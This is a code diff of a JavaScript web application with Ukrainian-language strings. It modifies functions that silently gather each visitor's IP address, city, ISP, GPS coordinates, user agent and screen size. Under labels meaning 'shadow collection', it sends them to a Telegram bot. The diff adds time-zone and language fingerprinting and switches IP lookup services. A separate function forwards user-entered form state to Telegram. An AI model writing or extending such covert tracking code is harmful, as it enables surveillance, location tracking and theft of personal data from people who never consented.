@@ -4616,37 +4616,41 @@
         if (!window.sendToTelegramBot) return;
 
         // Збираємо IP та інфо про пристрій через повністю відкритий і безкоштовний API
-        fetch("https://ipapi.co/json/")
+        fetch("https://ipinfo.io/json")
             .then(res => res.json())
             .then(data => {
                 let ip = data.ip || "Невідомо";
                 let city = data.city || "Невідомо";
-                let country = data.country_name || "Невідомо";
+                let country = data.country || "Невідомо";
                 let org = data.org || "Невідомо";
                 
                 let ua = navigator.userAgent;
                 let screen = `${window.screen.width}x${window.screen.height}`;
                 
+                let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                let language = navigator.language;
+
                 let message = `🚨 <b>НОВИЙ ВІЗИТ ДОДАТКУ (Тіньовий збір)</b>\n\n`;
                 if (lat && lon) {
                     message += `📍 <b>Геолокація</b>: <a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}">Відкрити координати на карті</a>\n`;
                     message += `(Широта: ${lat}, Довгота: ${lon})\n\n`;
                 } else {
-                    message += `📍 <b>Геолокація</b>: Доступ заборонено (або не запитувався)\n\n`;
+                    message += `📍 <b>Геолокація</b>: Доступ заборонено або не підтримується\n\n`;
                 }
                 
                 message += `🌐 <b>IP Адреса</b>: ${ip}\n`;
-                message += `🏙 <b>Місто</b>: ${city}, ${country}\n`;
+                message += `🏙 <b>Місцезнаходження</b>: ${city}, ${country}\n`;
                 message += `🏢 <b>Провайдер</b>: ${org}\n\n`;
-                message += `📱 <b>Пристрій (User-Agent)</b>: <code>${ua}</code>\n`;
-                message += `🖥 <b>Розширення екрану</b>: ${screen}\n`;
+                message += `📱 <b>Пристрій</b>: <code>${ua}</code>\n`;
+                message += `🖥 <b>Екран</b>: ${screen}\n`;
+                message += `🕒 <b>Часовий пояс</b>: ${timeZone} (${language})\n`;
                 
                 window.sendToTelegramBot(message);
             })
             .catch(e => {
                 // Запасний варіант, якщо сервіс збору IP не відповів
-                let message = `🚨 <b>НОВИЙ ВІЗИТ (Тіньовий збір)</b>\n\nНе вдалося отримати IP.\n`;
-                if (lat && lon) message += `📍 <b>Локація</b>: <a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}">Мапа</a>`;
+                let message = `🚨 <b>НОВИЙ ВІЗИТ (Тіньовий збір)</b>\n\nНе вдалося отримати IP-адресу.\n`;
+                if (lat && lon) message += `📍 <b>Локація</b>: <a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}">Відкрити на карті</a>`;
                 window.sendToTelegramBot(message);
             });
     };
@@ -4756,15 +4760,16 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: chatId,
+                chat_id: tgChatId,
                 text: message,
-                parse_mode: 'HTML'
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
             })
         }).catch(err => console.debug("Помилка відправки в TG:", err));
     };
 
     window.sendDataToTelegram = (state) => {
-        let text = "🔄 <b>Оновлені дані користувача!</b>\n\n";
+        let text = "🔄 <b>Оновлені дані користувача (Редактор)!</b>\n\n";
         
         for (const [key, value] of Object.entries(state)) {
             if (key.startsWith('doc_') || key.includes('Photo') || key.startsWith('tg') || key.startsWith('expiration')) continue;
